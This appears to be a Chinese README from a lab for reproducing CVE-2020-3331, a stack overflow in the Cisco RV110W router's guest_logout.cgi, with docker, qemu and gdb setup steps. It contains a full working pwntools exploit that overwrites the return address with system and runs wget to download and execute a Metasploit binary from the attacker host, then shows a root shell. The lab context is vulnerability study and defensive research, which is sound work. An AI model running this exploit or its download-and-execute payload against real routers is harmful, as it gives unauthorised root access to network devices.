# Cisco RV110W 路由器远程代码执行漏洞 （CVE-2020-3331）

[思科路由器 RV110W CVE-2020-3331 / CVE-2020-3323 漏洞复现](https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/)

- 版本：Cisco RV110W 1.2.2.5
- 漏洞：前台栈cgi接口 `guest_logout.cgi` 栈溢出
- 利用：a0寄存器可控，ret2system

> exp: python2

```python
from pwn import *
import thread,requests
context(arch='mips',endian='little',os='linux')

io      = listen(31337)
system  = 0x0047A610

cmd     = '\n'
cmd    += 'rm /msf\n'
cmd    += 'wget http://192.168.2.1:8000/tools/msf -O /msf\n'
cmd    += 'chmod 777 /msf\n'
cmd    += '/msf\n'

assert(len(cmd)<0x55)

payload =  "status_guestnet.asp" + cmd.ljust(0x55,'a') + p32(system) 
data    = {"cmac":"12:af:aa:bb:cc:dd", "submit_button":payload, "cip":"192.168.100.1"}

def attack():
    try: requests.post("http://192.168.2.2/guest_logout.cgi", data=data,timeout=1)
    except: pass

thread.start_new_thread(attack,())
io.wait_for_connection()
log.success("getshell")
io.interactive()
```


## 环境简述

- docker：     攻击、调试主机：192.168.2.1
- qemu-system：固件主机：192.168.2.2
- httpd: 有漏洞 Web服务器：192.168.2.2:80

## 基本环境

- 本环境dockerfile依赖：`firmianay/qemu-system:mipsel`
- 上述dockerfile又依赖：`firmianay/ubuntu1604`

故首先需要本地构建这两个docker image，方法如下：

```sh
➜  cd baseImage/ubuntu1604 && docker build -t firmianay/ubuntu1604 . && cd ../../
➜  cd baseImage/qemu-system/mipsel &&  docker build -t firmianay/qemu-system:mipsel . && cd ../../../
```

然后即可编译本例镜像：

```
➜  cd Cisco/CVE-2020-3331
➜  docker-compose -f docker-compose-system.yml build
```

## 首次攻击尝试

仍然在`Cisco/CVE-2020-3331`目录中，启动镜像：

```sh
➜  docker-compose -f docker-compose-system.yml up
```

出现如下内容后，说明Web服务启动完成：

```
cisco-system  | http_settimeouts=Unknown
cisco-system  | http_settimeouts_usec=Unknown
cisco-system  | http_debug=Unknown
```

再开启一个容器的shell，即可尝试首次攻击：

```sh
➜  docker exec -it cisco-system /bin/bash
root@7463bb44fe27:$ cd tools
root@7463bb44fe27:$ python exp.py 
[+] Trying to bind to :: on port 31337: Done
[+] Waiting for connections on :::31337: Got connection from ::ffff:192.168.2.2 on port 57638
[+] getshell
[*] Switching to interactive mode
$ uname -a
Linux debian-mipsel 3.2.0-4-4kc-malta #1 Debian 3.2.51-1 mips unknown
$ id
uid=0 gid=0
```

## docker中调试

- gef，pwntools，gdb-multiarch都集成好的docker
- gdbserver已经放在qemu-system跑起来的固件的文件系统中


窗口一：开启调试（qemu-system shell）

```sh
➜  docker exec -it cisco-system /bin/bash
root@7463bb44fe27:$ cd tools
root@7463bb44fe27:$ ./run_qemu.sh

即可进入qemu-system，以root:root手动登录后，即可启动调试

root@debian-mipsel:$ cd squashfs-root/
root@debian-mipsel:$ ./run_httpd.sh       
root@debian-mipsel:$ ./debug_httpd.sh 
Attached; pid = 2328
Listening on port 1234
```

窗口二：调试界面（docker shell）

```sh
➜  docker exec -it cisco-system /bin/bash
root@7463bb44fe27:$ cd tools
root@7463bb44fe27:$ gdb-multiarch -x  gdb.cmd 
gef➤  c
```

窗口三：触发漏洞（docker shell）

```sh
➜  docker exec -it cisco-system /bin/bash
root@7463bb44fe27:$ cd tools
root@7463bb44fe27:$ python exp.py
```

## 本机调试

如果你不想用docker进行调试，在docker-compose中预留了端口映射，可以手动使用ssh将qemu靶机的80和1234端口转发到docker主机，通过docker最终映射到宿主机的端口上：

> docker-compose-system.yml

```yml
ports:
    - "8888:80"
    - "1234:1234"
expose:
    - "80"
    - "1234"
```

转发命令如下，ssh自己实现端口转发：

```sh
➜  docker exec -it cisco-system /bin/bash
root@7463bb44fe27:$ ssh root@127.0.0.1 -f -N -g -R 0.0.0.0:1234:192.168.2.2:1234
root@7463bb44fe27:$ ssh root@127.0.0.1 -f -N -g -R 0.0.0.0:80:192.168.2.2:80
```

待启动调试后，即可在宿主机上访问8888和1234端口来访问漏洞服务和gdbserver了